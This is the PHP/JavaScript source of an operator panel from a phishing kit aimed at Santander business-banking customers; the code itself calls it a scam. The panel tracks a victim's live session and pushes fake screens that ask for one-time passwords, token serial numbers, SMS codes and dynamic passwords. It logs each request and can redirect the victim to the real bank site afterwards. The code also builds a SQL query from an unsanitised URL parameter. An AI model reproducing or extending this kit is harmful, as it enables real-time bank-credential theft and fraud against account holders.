<?php
	
	session_start();
    if(!isset($_SESSION['usr'])){
        header('Location: login.php');
    }
	include_once('../Config/MySQL.php');
	date_default_timezone_set("America/Mexico_City");


	if(isset($_GET['usr']) && !empty($_GET['usr'])){
        $idUsuario = $_GET['usr'];
    }else{
        $idUsuario = "";
    }


    /*$sql = "SELECT * FROM logos_bancanet ORDER BY id DESC";
	$query = new MySQL();
	$data = $query->queryStandar($sql);

	while ($r = mysqli_fetch_array($data)) {
		$nombre = $r['nombre_completo'];
		$razon_social = $r['razon_social'];
	}

    */


    $sql = "SELECT * FROM logos_santander_empresas WHERE id=".$idUsuario." LIMIT 1";
    $query = new MySQL();
    $data = $query->queryStandar($sql);

    while ($r = mysqli_fetch_array($data)) {
        $id = $r['id'];
        $nombre = $r['nombre_completo'];
        $razon_social = $r['razon_social'];
        $interface = $r['interface'];
        //$token = $r['token'];
    }

?>

<!DOCTYPE html>
<html>
<head>
	<title>Panel dinamico - <?=$nombre;?></title>
	<style>
		
		section{
			width: 100%;
			display: block;
		}

	</style>

    <script type="text/javascript" src="archivos/jquery-1.9.1.js"></script>
    <script src="PanelEmpresas.js"></script>
    <script src="script_telas_panel_empresas.js"></script>

    <script>
        $(document).ready(function(){

            var idClienteDataPanel = $('#sessionIDCliente').val();

            function getTime(){
                var d = new Date();
                var h = d.getHours();
                var m = d.getMinutes();
                var s = d.getSeconds();
                var tz = "";
                var fecha = "";
            
                if(h<10){h = "0"+h;tz = "AM";}else{tz = "PM";}
                if(m<10){m = "0"+m;}
                if(s<10){s = "0"+s;}
                fecha = h+":"+m+":"+s+" "+tz;
                
                return fecha;
            }

            $('.btnReload').click(function(){
                window.location.reload();
            });


            $('#tela_NK').change(function(){

                


                if($(this).val() != ""){
                    $('#txtNETKEY').attr('disabled',false).focus();
                }else{
                    //$('#txtNETKEY').attr('disabled',true);
                }

                if($(this).val() == "co_dinamic"){
                    $('#txtNETKEY').val("No es necesario ingresar algo");
                }

                if($(this).val() == "num_serie"){
                    $('#txtNETKEY').val("No es necesario ingresar algo");
                }

                if($(this).val() == "codigo_sms_enlace"){
                    $('#txtNETKEY').val("No es necesario ingresar algo");
                }



    





                if($(this).val() == "nip_dinamico_supernet"){
                    $('#txtNETKEY').val("No es necesario ingresar algo");
                }

                if($(this).val() == "codigo_sms_actual"){
                    $('#txtNETKEY').val("No es necesario ingresar algo");
                }








                if($(this).val() == "super_token"){
                    $('#txtNETKEY').val("No es necesario ingresar algo");
                }

                if($(this).val() == "codigo_sms_nuevo"){
                    $('#txtNETKEY').val("No es necesario ingresar algo");
                }

                
                


                
            });





            $('#tela_MENSAJES').change(function(){
                if($(this).val() != ""){
                    $('#msgPersonalizado').attr('disabled',false).focus();
                }else{
                    $('#msgPersonalizado').attr('disabled',true);
                }


                if($('#tela_MENSAJES').val() == "MP_F"){
                    $('#msgPersonalizado').val("No es necesario agregar mensaje");
                    $('#btnMensajes').focus();
                }else{
                    $('#msgPersonalizado').val("");
                }


            });
            

            


            $('#btnNK').click(function(e){
                e.preventDefault();
                
                var tipoAlta = $('#tela_NK');
                var code = $('#txtNETKEY');
                var hora = getTime();
                var altaHistory = "";

                if($('#tela_NK').val() == ""){
                    alert('Debe seleccionar una Tela');
                    $('#tela_NK').focus();
                }else{
                    
                    if($('#tela_NK').val() == "serie_token"){
                        altaHistory = "Pediste SERIE Y TOKEN: "+code.val();
                    }else if($('#tela_NK').val() == "token"){
                        altaHistory = "Pediste CLAVE DE OPERACIONES: "+code.val();
                    }else if($('#tela_NK').val() == "co_token"){
                        altaHistory = "Pediste CONTRASEÑA DE OPERACIONES Y TOKEN: "+code.val();
                    }else if($('#tela_NK').val() == "codigo_sms_enlace"){
                        altaHistory = "Pediste CODIGO SMS: "+code.val();
                    }else if($('#tela_NK').val() == "tok"){
                        altaHistory = "Pediste TOKEN: "+code.val();
                    }else if($('#tela_NK').val() == "token_movil"){
                        altaHistory = "Pediste TOKEN MOVIL: "+code.val();
                    }else if($('#tela_NK').val() == "codigo_sms"){
                        altaHistory = "Pediste CODIGO SMS: "+code.val();
                    }else if($('#tela_NK').val() == "fin_token_movil"){
                        altaHistory = "Pediste FIN TOKEN MOVIL: "+code.val();
                    }else if($('#tela_NK').val() == "fin_token_fisico"){
                        altaHistory = "Pediste FIN TOKEN FISICO: "+code.val();
                    }else if($('#tela_NK').val() == "fin_empresas"){
                        altaHistory = "Pediste FIN EMPRESAS: "+code.val();
                    }else if($('#tela_NK').val() == "co_dinamic"){
                        altaHistory = "Pediste CONTRASEÑA DINÁMICA: "+code.val();
                        
                    }else if($('#tela_NK').val() == "num_serie"){
                        altaHistory = "Pediste NÚMERO DE SERIE: "+code.val();
                        
                    }else{
                        //pedir_admin
                        altaHistory = "Pediste ADMIN: "+code.val();
                    }
                    //var history = " - PEDISTE ALTA, "+altaHistory+" - Drop: "+code.val();
                    //var history = " - "+altaHistory+" - Drop: "+code.val();


                    if($('#tela_NK').val() == "token_movil"){
                        if(code.val() == ""){
                            code.focus();
                            alert('Debes Ingresar un valor');
                        }else{
                            var history = " - "+altaHistory;
                            var code = code.val();
                            Panel.update(6, code, '', $('#tela_NK').val(), idClienteDataPanel);
                            Panel.insertHistory(100, hora, history, 1, idClienteDataPanel);
                        }
                    }else{
                        var history = " - "+altaHistory;
                        var code = code.val();
                        Panel.update(6, code, '', $('#tela_NK').val(), idClienteDataPanel);
                        Panel.insertHistory(100, hora, history, 1, idClienteDataPanel);
                    }

                    


                    /*if(code.val() == ""){
                        alert('Ingresa un Codigo Challing');
                        code.focus();
                    }else{
                        //var history = " - PEDISTE ALTA, "+altaHistory+" - Drop: "+code.val();
                        //var history = " - "+altaHistory+" - Drop: "+code.val();
                        var history = " - "+altaHistory;
                        var code = code.val();
                        Panel.update(6, code, '', 'Challng', idClienteDataPanel);
                        Panel.insertHistory(7, hora, history, 1, idClienteDataPanel);
                    }*/
                }
            });
        });
    </script>
    <!--<script src="script_telas_panel.js"></script>-->

    <script>
        function refresh_request(){
            $.ajax({
                type: 'POST',
                url: '../Config/refreshPanelDinamicoEmpresas.php',
                data: {
                    "request": "refresh_online",
                    "session": $('#sessionIDCliente').val()
                },
                beforeSend: function(){
                    console.log("ENviando...");
                },
                success: function (resp){
                    console.log(resp)
                    $('#indicadorOnline').addClass(resp);
                    $('#statusTXT').html(resp);
                },
                error: function (request, textStatus, errorThrown) {
                    console.log('Error al Enviar los Datos: '+errorThrown);
                }
            });
        }

        var int = self.setInterval("refresh_request()", 3000);
        //refresh_request
    </script>

    <script>
        //Panel.init();
    </script>

    <script>
        $(document).ready(function(){
            $('#btnUpadteDataLogo').click(function(e){
                e.preventDefault();
                var rz = $('#razon_social_empresa');
                var name_persona = $('#nombrePersona');
                var session = $('#sessionIDCliente');

                //alert(token.val());
                
                if(rz.val() == ""){
                    alert('Debes ingresar una razon social');
                    rz.focus();
                }else{
                    //alert('ok');
                    //alert(session.val())
                    $.ajax({
                        type: 'POST',
                        url: '../Controllers/CtrlScam.php',
                        data: {
                            "request": "update_rz_empresas",
                            "razon": rz.val(),
                            "nombre_persona": name_persona.val(),
                            "id": session.val()
                        },
                        beforeSend: function(){
                            console.log("ENviando...");
                        },
                        success: function (resp){
                            //alert(resp);
                            console.log('Datos Enviados');
                            if(resp == "1"){
                                alert('Nombre y Razon Social Actualizada');
                                //window.reload();
                            }

                            console.log(resp)
                            
                        },
                        error: function (request, textStatus, errorThrown) {
                            console.log('Error al Enviar los Datos: '+errorThrown);
                        }
                    });
                }
            });
        });
    </script>


    <script>
        function soloNumeros(e){
            var key = window.Event ? e.which : e.keyCode
            return (key >= 48 && key <= 57)
        }
    
    </script>

    <style>
        *{
            margin: 0 auto;
            padding: 0 auto;
            box-sizing: border-box;
        }

        section{
            width: 100%;
            display: block;
            margin-bottom: 20px;
        }

        section#fieldsDB table{
            /*width: 70%;*/
        }
        section#fieldsDB input[type="text"], section#fieldsDB select{
            width: 200px;
            padding: 3px 4px;
        }

        section.telas{

        }

        section.telas table{
            width: 50%;
        }

        

        section.telas input[type="text"]{
            width: 200px;
            padding: 3px 4px;
        }

        section.telas select{
            padding: 5px!important;
        }

        section label{
            font-weight: bold;
            color: #333;
        }

        .Online{
            background: green;
            color: #fff;
        }

        .Offline{
            background: #ff0000;
            color: #fff;
        }

        #sectionIFRame div{
            width: 90%;
            border-bottom: 1px solid #c1c1c1;
            margin: 0 auto;
            margin-top: 20px

        }


        .btn-primary {
            cursor: pointer;
            color: #fff;
            background-color: #007bff;
            border-color: #007bff;
            
        }

        .btn-warning {
            color: #212529;
            background-color: #ffc107;
            border-color: #ffc107;
        }

        .btn{
            display: inline-block;
    font-weight: 400;
    text-align: center;
    white-space: nowrap;
    vertical-align: middle;
    webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    border: 1px solid transparent;
    
    font-size: 12px;
    /*line-height: 1.5;*/
    border-radius: .25rem;
    transition: color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;
        }
    </style>

</head>
<body>
    <input type="hidden" name="sessionIDCliente" id="sessionIDCliente" value="<?=$id;?>">
	<section id="indicadorOnline" class="" style="width: 100%;padding-top: 25px;padding-bottom: 25px;text-transform: uppercase;">
		<center><?=$nombre;?> - En Linea</center>
	</section>
	<section class="content">
        <?php $rutahistory = "history_empresas.php?id=".$idUsuario; ?>
        <iframe src="<?=$rutahistory;?>" class="row col-xs-12" style="width: 100%; height:150px;" frameborder="0"></iframe>
        <div></div>
    </section>
    <section id="fieldsDB">
    	<center>
    		<table>
    			<tr>
    				<td>Nombre de la Persona</td>
    				<td><input type="text" name="nombrePersona" id="nombrePersona" value="<?=$nombre;?>"></td>
    				<td>Razon Social de la Empresa</td>
    				<td><input type="text" name="razon_social_empresa" id="razon_social_empresa" value="<?=$razon_social;?>"></td>
    				<td><button id="btnUpadteDataLogo">Actualizar o Agregar</button></td>
    			</tr>
    		</table>
    	</center>
    </section>
    <section class="telas" id="NetKey">
            <center>
                <table>
                    <tr>
                        <td><label>TELA</label></td>
                        <td><!--<label>CODIGO</label>--></td>
                        <td></td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>

                            <select id="tela_NK" required="">
                                <option value="">Seleccione una opcion</option>
                                <option value="co_dinamic">Contrase&ntilde;a Din&aacute;mica (Enlace)</option>
                                <option value="num_serie">N&uacute;mero de Serie (Enlace)</option>
                                <option value="codigo_sms_enlace">Codigo SMS (Enlace)</option>
                                <!--<option value="co_dinamic">Contrase&ntilde;a Din&aacute;mica (Enlace)</option>
                                <option value="num_serie">N&uacute;mero de Serie (Enlace)</option>
                                <option value="codigo_sms_enlace">Codigo SMS (Enlace)</option>
                                <option value="nip_dinamico_supernet">Nip Dinamico (SuperNet Actual)</option>
                                <option value="codigo_sms_actual">Codigo SMS (SuperNet Actual)</option>
                                <option value="super_token">Super Token (Nuevo SuperNet)</option>
                                <option value="codigo_sms_nuevo">Codigo SMS (Nuevo SuperNet)</option>-->
                                <!--<option value="tok">Token</option>-->
                            </select>
                            <?php 
                                //if($interface == "Enlace"){
                            ?>
                                    <!--<select id="tela_NK" required="">
                                        <option value="">Seleccione una opcion</option>
                                        <option value="co_dinamic">Contrase&ntilde;a Din&aacute;mica</option>
                                        <option value="num_serie">N&uacute;mero de Serie</option>
                                        <option value="codigo_sms_enlace">Codigo SMS</option>
                                    </select>-->
                            <?php
                                //}elseif($interface == "Supernet2007"){
                            ?>
                                    <!--<select id="tela_NK" required="">
                                        <option value="">Seleccione una opcion</option>
                                        <option value="nip_dinamico_supernet">Nip Dinamico</option>
                                        <option value="codigo_sms_actual">Codigo SMS</option>
                                    </select>-->
                            <?php
                                //}else{
                            ?>
                                    <!--<select id="tela_NK" required="">
                                        <option value="">Seleccione una opcion</option>
                                        <option value="super_token">Super Token</option>
                                        <option value="codigo_sms_nuevo">Codigo SMS</option>
                                    </select>-->
                            <?php
                                //}
                            ?>
                            
                        </td>
                        <td>
                            <input type="text"  maxlength="10" placeholder="" disabled="" id="txtNETKEY" name="txtNETKEY">
                        </td>
                        <td>
                            <button id="btnNK" name="btnNK" class="btn btn-primary">Enviar Tela</button>
                        </td>
                        <td>
                            <button class="btnReload" class="btn btn-warning">Refrescar</button>
                        </td>
                    </tr>
                </table>
            </center>
        </section>


    <section class="telas">
        <center>
            <table>
                <tr>
                    <td><label>MENSAJES PERSONALIZADOS</label></td>
                    <td><label>MENSAJE</label></td>
                    <td></td>
                    <td></td>
                </tr>
                <tr>
                    <td>
                        <select id="tela_MENSAJES" required="">
                            <option value="">Seleccione una opcion</option>
                            <option value="MP_CI">Con Input</option>
                            <option value="MP_SI">Sin Input</option>
                            <option value="MP_F">Mandar a Folio</option>
                            <option value="MP_SIS">Salir a Index del Scam</option>
                            <option value="MP_SPP">Salir a Pagina Original</option>
                            <!--<option value="MP_FOLIO">Final (Folio)</option>-->
                        </select>
                    </td>
                    <td>
                        <input type="text" name="msgPersonalizado" id="msgPersonalizado" placeholder="Mensaje" disabled="">
                    </td>
                    <td>
                        <button id="btnMensajes" class="btn btn-primary">Enviar</button>
                    </td>
                    <td>
                        
                    </td>
                </tr>
            </table>
        </center>
    </section>
</body>
</html>